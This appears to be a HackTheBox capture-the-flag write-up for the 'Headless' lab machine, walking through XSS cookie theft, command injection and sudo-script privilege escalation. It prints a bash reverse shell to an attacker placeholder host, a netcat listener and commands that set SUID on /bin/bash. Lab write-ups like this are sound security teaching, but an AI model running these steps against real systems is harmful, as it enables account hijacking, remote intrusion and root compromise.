---
title: HTB - Headless
date: 2024-07-10T15:42:00
categories:
  - Posts
  - HackTheBox
tags:
  - SessionHijacking
  - CommandInjection
  - XSS
  - SUID
image: ../assets/images/Headless.png
---
## Summary
Use XSS for session hijacking <br/>
Exploit command injection for initial access <br/>
Leverage sudo permissions for root 
## Enumeration
#### Port Scanning
Let's kick things off with an nmap scan.
```
$ nmap -sV -sC -T4 10.10.11.8 -oA nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-10 11:29 EDT
Nmap scan report for headless.htb (10.10.11.8)
Host is up (0.023s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Wed, 10 Jul 2024 15:29:40 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=7/10%Time=668EA8D0%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.11\.2\r\nDate:\x20Wed,\x2010\x20Jul\x202024\x2015:29:40\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Z
SF:fs;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\
SF:x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\
SF:x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wid
SF:th,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Construct
SF:ion</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20b
SF:ody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\
SF:x20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20di
SF:splay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justif
SF:y-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:align-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x20
SF:0,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYP
SF:E\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x
SF:20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20resp
SF:onse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20vers
SF:ion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\
SF:x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x
SF:20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Looks like we have SSH open on the default port and a webserver running WerkZeug on port 5000. Of note is the 'is_admin' cookie set by the server. 
#### Port 5000
While we visit the server on the browser, let's do some directory enumeration with gobuster. 
```
$ gobuster dir -u http://headless.htb:5000 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://headless.htb:5000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/support              (Status: 200) [Size: 2363]
/dashboard            (Status: 500) [Size: 265]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```
We get results for /support and /dashboard, more on that later. Below, we see the homepage. There doesn't appear to be any functionality other than a link to the support page. Let's follow.
![Pasted image 20240710113326.png](../assets/images/Pasted%20image%2020240710113326.png)
Here we find a form that's a candidate for cross-site scripting (XSS). We'll set up our proxy for Burp Suite, fill out the form, and intercept the request. 
![Pasted image 20240710124640.png](../assets/images/Pasted%20image%2020240710124640.png)
Our first payload of `<script>alert(1)</script>` in the message field triggered the below response.
![Pasted image 20240710130813.png](../assets/images/Pasted%20image%2020240710130813.png)
As we can see from the XSS attempt, our browser information has been sent to the administrators for investigation. Since our user-agent is reflected on the page, let's replace it with an XSS payload and see if that is a potential vector for exploitation.
![Pasted image 20240710134048.png](../assets/images/Pasted%20image%2020240710134048.png)
The response contains our alert box, so there is an XSS vulnerability. Going one step further, let's see if we can make it actionable by getting a response from an administrator opening our hacking report. 
## Exploitation

First, we'll spin up a webserver on our host machine with python.
```
python -m http.server 80
```
Next, edit the user-agent field in our request using the Repeater tab in Burp Suite to make a request to our webserver.
![Pasted image 20240710140540.png](../assets/images/Pasted%20image%2020240710140540.png)
We got a hit!
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.8 - - [10/Jul/2024 14:03:42] "GET / HTTP/1.1" 200 -
10.10.11.8 - - [10/Jul/2024 14:03:42] code 404, message File not found
10.10.11.8 - - [10/Jul/2024 14:03:42] "GET /favicon.ico HTTP/1.1" 404 -
```
Let's see if we can perform session hijacking by stealing the administrator's cookie by including that in our malicious XSS request.
![Pasted image 20240710140908.png](../assets/images/Pasted%20image%2020240710140908.png)
The request came back as before and the path contains a cookie!
```
10.10.11.8 - - [10/Jul/2024 14:09:45] "GET /is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 404 -
```
Now that we have stolen an administrator cookie, it's important to recall that the gobuster results contained a dashboard. Let's visit that and analyze the response.
![Pasted image 20240710125020.png](../assets/images/Pasted%20image%2020240710125020.png)
By the response, it seems the dashboard does exist but we don't have the privileges to access it. Let's edit our cookie to reflect the result we got from the XSS attack. I like using the OWASP Penetration Testing Kit extension for Firefox. 
![Pasted image 20240710141603.png](../assets/images/Pasted%20image%2020240710141603.png)
Refresh the page and we're in!
![Pasted image 20240710141714.png](../assets/images/Pasted%20image%2020240710141714.png)
The only functionality here is generating a report. It doesn't provide a download as expected but rather outputs the message 'Systems are up and running!' Let's turn our Burp Suite intercept back on and examine the request.
![Pasted image 20240710143034.png](../assets/images/Pasted%20image%2020240710143034.png)
There is a single date parameter in the POST request. Let's attempt command injection by appending '&&whoami' and URL-encoding the ampersands.
![Pasted image 20240710143327.png](../assets/images/Pasted%20image%2020240710143327.png)
After the 'Systems are up and running!' message we now see 'dvir'. That must mean that our command injection worked and 'dvir' is the user running the webserver! We'll follow this up by creating a reverse shell, hosting it with a simple http server, starting a netcat listener, and then downloading and executing it with our modified POST request.
```
$ cat shell.sh
#!/bin/bash
bash -i >& /dev/tcp/{attacker IP}/1337 0>&1
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
In a separate terminal tab or window...
```
nc -lvnp 1337
listening on [any] 1337 ...
```
![Pasted image 20240710144502.png](../assets/images/Pasted%20image%2020240710144502.png)
And we got a shell!
```
listening on [any] 1337 ...
connect to [10.10.*.*] from (UNKNOWN) [10.10.11.8] 53468
bash: cannot set terminal process group (1352): Inappropriate ioctl for device
bash: no job control in this shell
dvir@headless:~/app$ whoami
whoami
dvir
```
Head over to `/home/dvir/` for the user flag and then we'll work on privilege escalation.
## Privilege Escalation
The first thing I like to check for elevating privileges is our sudo permissions.
```
dvir@headless:~$ sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```
We don't need a password to run syscheck (important since we don't have one) and it's not an application that sounds familiar so let's investigate further.
```
dvir@headless:~$ ls -la /usr/bin/syscheck
-r-xr-xr-x 1 root root 768 Feb  2 16:11 /usr/bin/syscheck

dvir@headless:~$ cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```
We cannot write to syscheck but we do have read privileges. Near the bottom, we have the opportunity to run a bash script if the 'initdb.sh' process isn't running. We can quickly verify this by running `sudo syscheck`. We get back the message 'Database service is not running. Starting it...'. This is great news for us and allows us to create the 'initdb.sh' file in our user's home directory (or perhaps /tmp to be more inconspicuous). Once we run `sudo syscheck`, the 'initdb.sh' file will be called as root. In this example, we'll use this opportunity to set `/bin/bash` as a SUID binary.
```
dvir@headless:~$ touch initdb.sh
dvir@headless:~$ echo 'chmod u+s /bin/bash' > initdb.sh
dvir@headless:~$ chmod +x initdb.sh
dvir@headless:~$ sudo syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.9G
System load average:  0.00, 0.01, 0.00
Database service is not running. Starting it...
```
Checking if we were successful.
```
dvir@headless:~$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 Apr 24  2023 /bin/bash

```
The SUID bit was set so let's call bash with '-p' to inherit privileges and go get that root flag!
```
dvir@headless:~$ /bin/bash -p
/bin/bash -p
whoami
root
```